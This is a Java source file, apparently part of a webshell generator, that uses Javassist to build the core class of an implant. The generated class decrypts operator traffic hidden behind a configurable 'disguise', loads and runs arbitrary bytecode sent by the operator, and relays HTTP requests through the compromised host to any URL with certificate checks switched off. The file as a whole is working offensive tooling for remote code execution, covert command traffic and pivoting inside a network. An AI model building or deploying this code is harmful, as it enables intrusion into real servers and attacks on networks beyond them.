package org.leo.jmg.core;

import javassist.*;
import org.leo.core.entity.Disguise;
import org.leo.jmg.ShellGeneratorConfig;

public class LeoCore {
    Disguise reqDisguise;
    Disguise respDisguise;
    String payloadKey;

    public LeoCore(Disguise reqDisguise, Disguise respDisguise, String payloadKey) {
        this.reqDisguise = reqDisguise;
        this.respDisguise = respDisguise;
        this.payloadKey = payloadKey;
    }

    public CtClass dump(String classname, CoreGenerationNames config) throws CannotCompileException, NotFoundException {
        // 生成代码只引用 JDK 类型，使用完全独立的类池，避免默认池被其他模板重映射后污染类型解析。
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        CtClass ctClass = pool.makeClass(classname);
        ctClass.getClassFile().setVersionToJava5();
        CtClass ctClass0 = pool.get("java.lang.ClassLoader");
        CtClass ctClass1 = pool.get("java.lang.reflect.InvocationHandler");
        ctClass.setSuperclass(ctClass0);
        ctClass.addInterface(ctClass1);

        //fields
        {
            ctClass.addField(CtField.make("private java.util.HashMap " + config.getFieldParams() + ";", ctClass));
            ctClass.addField(CtField.make("private java.util.HashMap " + config.getFieldResults() + ";", ctClass));
            ctClass.addField(CtField.make("private static String " + config.getFieldHostId() + "= java.util.UUID.randomUUID().toString();", ctClass));
            ctClass.addField(CtField.make("private static java.util.concurrent.ConcurrentHashMap " + config.getFieldComponents() + "=new java.util.concurrent.ConcurrentHashMap();", ctClass));
        }

        //constructor
        {
            CtConstructor defaultCons = new CtConstructor(new CtClass[]{}, ctClass);
            defaultCons.setBody("{super(java.lang.Thread.currentThread().getContextClassLoader());}");
            ctClass.addConstructor(defaultCons);
        }
        //testConn
        {
            CtMethod testConn = CtNewMethod.make("private void " + config.getMethodTestConn() + "() {\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"components\", " + config.getFieldComponents() + ".keySet().toArray(new String[" + config.getFieldComponents() + ".size()]));\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"hostId\", " + config.getFieldHostId() + ");\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(200));\n" +
                                                 "    }", ctClass);

            ctClass.addMethod(testConn);
        }

        //invokeComponent
        {
            CtMethod invokeComponent = CtNewMethod.make("private void " + config.getMethodInvokeComponent() + "() throws Exception {\n" +
                                                        "        String var1 = (String) this." + config.getFieldParams() + ".get(\"componentName\");\n" +
                                                        "        ClassLoader var3 = Thread.currentThread().getContextClassLoader();\n" +
                                                        "        Thread.currentThread().setContextClassLoader(this);\n" +
                                                        "        try {\n" +
                                                        "            Object var2 = ((Class)" + config.getFieldComponents() + ".get(var1)).newInstance();\n" +
                                                        "            if (var2 instanceof Runnable) { ((Runnable)var2).run(); } else { var2.equals(this); }\n" +
                                                        "        } finally {\n" +
                                                        "            Thread.currentThread().setContextClassLoader(var3);\n" +
                                                        "        }\n" +
                                                        "    }", ctClass);

            ctClass.addMethod(invokeComponent);
        }

        //loadComponent
        {
            CtMethod loadComponent = CtNewMethod.make("private void " + config.getMethodLoadComponent() + "() {\n" +
                                                      "            String var1 = (String) this." + config.getFieldParams() + ".get(\"componentName\");\n" +
                                                      "            byte[] var2 = (byte[])this." + config.getFieldParams() + ".get(\"bytecode\");\n" +
                                                      "            " + config.getFieldComponents() + ".put(var1, defineClass(var2,0,var2.length));" +
                                                      "            " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(200));\n" +
                                                      "    }", ctClass);

            ctClass.addMethod(loadComponent);
        }
        //redirect
        {
            CtMethod redirect = CtNewMethod.make("" +
                                                 "private void " + config.getMethodRedirect() + "(java.util.HashMap dataMap) throws Exception {\n" +
                                                 "        String url= (String) dataMap.get(\"url\");\n" +
                                                 "        java.net.URL u = new java.net.URL(url);\n" +
                                                 "        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();\n" +
                                                 "        conn.setRequestMethod(\"POST\");\n" +
                                                 "        conn.setConnectTimeout(3000);\n" +
                                                 "        conn.setReadTimeout(0);\n" +
                                                 "        conn.setDoOutput(true);\n" +
                                                 "        conn.setDoInput(true);\n" +
                                                 "        if (javax.net.ssl.HttpsURLConnection.class.isInstance(conn)) {\n" +
                                                 "            ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
                                                 "            javax.net.ssl.HostnameVerifier hnv = (javax.net.ssl.HostnameVerifier) java.lang.reflect.Proxy.newProxyInstance(cl, new Class[]{javax.net.ssl.HostnameVerifier.class}, this);\n" +
                                                 "            javax.net.ssl.TrustManager tm = (javax.net.ssl.TrustManager) java.lang.reflect.Proxy.newProxyInstance(cl, new Class[]{javax.net.ssl.X509TrustManager.class}, this);\n" +
                                                 "            ((javax.net.ssl.HttpsURLConnection) conn).setHostnameVerifier(hnv);\n" +
                                                 "            javax.net.ssl.SSLContext sslCtx = javax.net.ssl.SSLContext.getInstance(\"SSL\");\n" +
                                                 "            sslCtx.init(null, new javax.net.ssl.TrustManager[]{tm}, null);\n" +
                                                 "            ((javax.net.ssl.HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());\n" +
                                                 "        }\n" +
                                                 "        byte[] newBody = (byte[]) dataMap.get(\"body\");\n" +
                                                 "        java.util.HashMap headers = (java.util.HashMap) dataMap.get(\"headers\");\n" +
                                                 "        java.util.Set headerKeys=headers.keySet();\n" +
                                                 "        java.util.Iterator iterator = headerKeys.iterator();\n" +
                                                 "        for (int i = 0; i < headerKeys.size(); i++) {\n" +
                                                 "            String key = (String) iterator.next();\n" +
                                                 "            if (key.equals(\"Content-Length\")) {\n" +
                                                 "                conn.setRequestProperty(key, String.valueOf(newBody.length));\n" +
                                                 "            } else if (key.equals(\"Host\")) {\n" +
                                                 "                conn.setRequestProperty(key, u.getHost());\n" +
                                                 "            } else if (key.equals(\"Connection\")) {\n" +
                                                 "                conn.setRequestProperty(key, \"close\");\n" +
                                                 "            } else if (key.equals(\"Content-Encoding\") || key.equals(\"Transfer-Encoding\")) {} else {\n" +
                                                 "                conn.setRequestProperty(key, (String) headers.get(key));}\n" +
                                                 "        }\n" +
                                                 "        java.io.OutputStream rout = conn.getOutputStream();\n" +
                                                 "        rout.write(newBody);\n" +
                                                 "        rout.flush();\n" +
                                                 "        rout.close();\n" +
                                                 "        java.io.InputStream inputStream;\n" +
                                                 "        try {\n" +
                                                 "            inputStream = conn.getInputStream();\n" +
                                                 "        }catch (java.io.IOException e) {\n" +
                                                 "            inputStream = conn.getErrorStream();\n" +
                                                 "        }\n" +
                                                 "        java.io.ByteArrayOutputStream result = new java.io.ByteArrayOutputStream();\n" +
                                                 "        byte[] var4 = new byte[1024];\n" +
                                                 "        int length;\n" +
                                                 "        while ((length = inputStream.read(var4)) != -1) {\n" +
                                                 "            result.write(var4, 0, length);\n" + "        }\n" +
                                                 "        " + config.getFieldResults() + ".put(\"url\",url);\n" +
                                                 "        " + config.getFieldResults() + ".put(\"body\",result.toByteArray());\n" +
                                                 "        " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(200));\n" +
                                                 "    }", ctClass);

            ctClass.addMethod(redirect);
        }
        if (reqDisguise.getTrafficDecodeBody() == null || reqDisguise.getTrafficDecodeBody().trim().isEmpty()
                || respDisguise.getTrafficEncodeBody() == null || respDisguise.getTrafficEncodeBody().trim().isEmpty()) {
            throw new IllegalArgumentException("Java Core 必须使用 traffic-only Disguise");
        }
        if (payloadKey == null || payloadKey.trim().isEmpty()) {
            throw new IllegalArgumentException("payloadKey不能为空");
        }
        ctClass.addField(CtField.make(
                "private static final javax.crypto.spec.SecretKeySpec " + config.getFieldPayloadSecret() + " = "
                        + PayloadCodecSource.secretKeySource(payloadKey) + ";", ctClass));
        ctClass.addField(CtField.make(
                "private static final java.security.SecureRandom " + config.getFieldPayloadRandom()
                        + " = new java.security.SecureRandom();",
                ctClass));
        ctClass.addMethod(CtNewMethod.make(
                renameTrafficMethod(reqDisguise.getTrafficDecodeBody(), "decodeTraffic",
                        config.getMethodTrafficDecode()), ctClass));
        ctClass.addMethod(CtNewMethod.make(
                renameTrafficMethod(respDisguise.getTrafficEncodeBody(), "encodeTraffic",
                        config.getMethodTrafficEncode()), ctClass));
        ctClass.addMethod(CtNewMethod.make(PayloadCodecSource.decodeMethod(
                config.getMethodPayloadDecode(), config.getFieldPayloadSecret()), ctClass));
        ctClass.addMethod(CtNewMethod.make(PayloadCodecSource.encodeMethod(
                config.getMethodPayloadEncode(), config.getFieldPayloadRandom(),
                config.getFieldPayloadSecret()), ctClass));
        //action
        {
            CtMethod action = CtNewMethod.make("private void " + config.getMethodAction() + "() throws Exception {\n" +
                                               "        java.util.HashMap var0 = this." + config.getFieldParams() + ";\n" +
                                               "        String var1 = (String)var0.get(\"operation\");\n" +
                                               "        Object var9 = var0.get(\"requestId\");\n" +
                                               "        java.util.HashMap var7 = new java.util.HashMap();\n" +
                                               "        Object var6 = var0.get(\"params\");\n" +
                                               "        if (var6 instanceof java.util.Map) var7.putAll((java.util.Map)var6);\n" +
                                               "        if (var0.get(\"hostId\") != null) var7.put(\"hostId\", var0.get(\"hostId\"));\n" +
                                               "        if (var0.get(\"component\") != null) var7.put(\"componentName\", var0.get(\"component\"));\n" +
                                               "        if (var0.get(\"action\") != null) var7.put(\"action\", var0.get(\"action\"));\n" +
                                               "        this." + config.getFieldParams() + " = var7;\n" +
                                               "        if (\"PING\".equals(var1)) this." + config.getMethodTestConn() + "();\n" +
                                               "        else if (\"RELAY\".equals(var1)) this." + config.getMethodRedirect() + "(var7);\n" +
                                               "        else if ((\"COMPONENT_LOAD\".equals(var1) || \"COMPONENT_INVOKE\".equals(var1))\n" +
                                               "                && !" + config.getFieldHostId() + ".equals(var7.get(\"hostId\"))) {\n" +
                                               "            this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(409));\n" +
                                               "            this." + config.getFieldResults() + ".put(\"errorCode\", \"HOST_ID_MISMATCH\");\n" +
                                               "            this." + config.getFieldResults() + ".put(\"hostId\", " + config.getFieldHostId() + ");\n" +
                                               "            this." + config.getFieldResults() + ".put(\"msg\", \"HostId does not match the current runtime instance\");\n" +
                                               "        } else if (\"COMPONENT_LOAD\".equals(var1)) this." + config.getMethodLoadComponent() + "();\n" +
                                               "        else if (\"COMPONENT_INVOKE\".equals(var1)) this." + config.getMethodInvokeComponent() + "();\n" +
                                               "        else this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(404));\n" +
                                               "        java.util.HashMap var8 = this." + config.getFieldResults() + ";\n" +
                                               "        Object var5 = var8.remove(\"code\");\n" +
                                               "        int var4 = var5 instanceof Number ? ((Number)var5).intValue() : 500;\n" +
                                               "        java.util.HashMap var3 = new java.util.HashMap();\n" +
                                               "        var3.put(\"requestId\", var9);\n" +
                                               "        var3.put(\"code\", Integer.valueOf(var4));\n" +
                                               "        if (var4 >= 200 && var4 < 300) {\n" +
                                               "                var3.put(\"data\", var8);\n" +
                                               "            } else {\n" +
                                               "                Object var2 = var8.remove(\"msg\");\n" +
                                               "                if (var2 == null) var2 = var8.remove(\"message\");\n" +
                                               "                if (var2 != null) var8.put(\"message\", var2);\n" +
                                               "                var3.put(\"error\", var8);\n" +
                                               "            }\n" +
                                               "        this." + config.getFieldResults() + " = var3;\n" +
                                               "    }", ctClass);

            ctClass.addMethod(action);
        }
        //processBuffer
        {
            CtMethod processBuffer = CtNewMethod.make(
                "private void " + config.getMethodProcessBuffer() + "(java.io.ByteArrayOutputStream buffer) throws Exception {\n" +
                "        this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
                "        Object var10 = null;\n" +
                "        try {\n" +
                "            this." + config.getFieldParams() + " = this."
                        + config.getMethodPayloadDecode() + "(this."
                        + config.getMethodTrafficDecode() + "(buffer.toByteArray()));\n" +
                "            var10 = this." + config.getFieldParams() + ".get(\"requestId\");\n" +
                "            this." + config.getMethodAction() + "();\n" +
                "        } catch (Exception e) {\n" +
                "            java.util.HashMap var11 = new java.util.HashMap();\n" +
                "            java.util.HashMap var12 = new java.util.HashMap();\n" +
                "            if (e.getMessage() != null) var12.put(\"message\", e.getMessage());\n" +
                "            var11.put(\"requestId\", var10);\n" +
                "            var11.put(\"code\", Integer.valueOf(500));\n" +
                "            var11.put(\"error\", var12);\n" +
                "            this." + config.getFieldResults() + " = var11;\n" +
                "        }\n" +
                "        buffer.reset();\n" +
                "        byte[] var3 = this." + config.getMethodTrafficEncode() + "(this."
                        + config.getMethodPayloadEncode() + "(this."
                        + config.getFieldResults() + "));\n" +
                "        buffer.write(var3, 0, var3.length);\n" +
                "    }", ctClass);
            ctClass.addMethod(processBuffer);
        }
        //invoke (InvocationHandler - handles Core entry and HTTPS proxy callbacks)
        {
            CtMethod invoke = CtNewMethod.make(
                "public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) {\n" +
                "    if (method == null) {\n" +
                "        if (args == null) return this." + config.getFieldParams() + ";\n" +
                "        if (args.length == 1 && args[0] instanceof java.io.ByteArrayOutputStream) {\n" +
                "            try {\n" +
                "                this." + config.getMethodProcessBuffer() + "((java.io.ByteArrayOutputStream) args[0]);\n" +
                "            } catch (Exception e) {\n" +
                "                throw new IllegalStateException(\"Core processing failed\", e);\n" +
                "            }\n" +
                "            return null;\n" +
                "        }\n" +
                "        if (args.length == 1 && args[0] instanceof java.util.Map) {\n" +
                "            this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
                "            this." + config.getFieldResults() + ".putAll((java.util.Map) args[0]);\n" +
                "        }\n" +
                "        return null;\n" +
                "    }\n" +
                "    String name = method.getName();\n" +
                "    if (name.equals(\"verify\")) return java.lang.Boolean.valueOf(true);\n" +
                "    if (name.equals(\"getAcceptedIssuers\")) return new java.security.cert.X509Certificate[0];\n" +
                "    return null;\n" +
                "}", ctClass);
            ctClass.addMethod(invoke);
        }
        return ctClass;
    }

    public Disguise getReqDisguise() {
        return reqDisguise;
    }

    public void setReqDisguise(Disguise reqDisguise) {
        this.reqDisguise = reqDisguise;
    }

    public Disguise getRespDisguise() {
        return respDisguise;
    }

    public void setRespDisguise(Disguise respDisguise) {
        this.respDisguise = respDisguise;
    }

    public byte[] genLeoCoreByClassName(String classname, ShellGeneratorConfig config) throws Exception {
        return genLeoCoreByClassName(classname, CoreGenerationNames.from(config));
    }

    public CtClass dump(String classname,
                        ShellGeneratorConfig config) throws CannotCompileException, NotFoundException {
        return dump(classname, CoreGenerationNames.from(config));
    }

    public byte[] genLeoCoreByClassName(String classname,
                                        CoreGenerationNames config) throws Exception {
        CtClass ctClass = dump(classname, config);
        try {
            return ctClass.toBytecode();
        } finally {
            ctClass.detach();
        }
    }

    private static String renameTrafficMethod(String source, String originalName, String generatedName) {
        if (source == null || source.trim().isEmpty()) {
            throw new IllegalArgumentException("traffic 编解码方法不能为空");
        }
        String marker = originalName + "\\s*\\(";
        String renamed = source.replaceFirst("\\b" + marker, generatedName + "(");
        if (renamed.equals(source)) {
            throw new IllegalArgumentException("traffic 方法缺少 " + originalName + " 声明");
        }
        return renamed;
    }

}
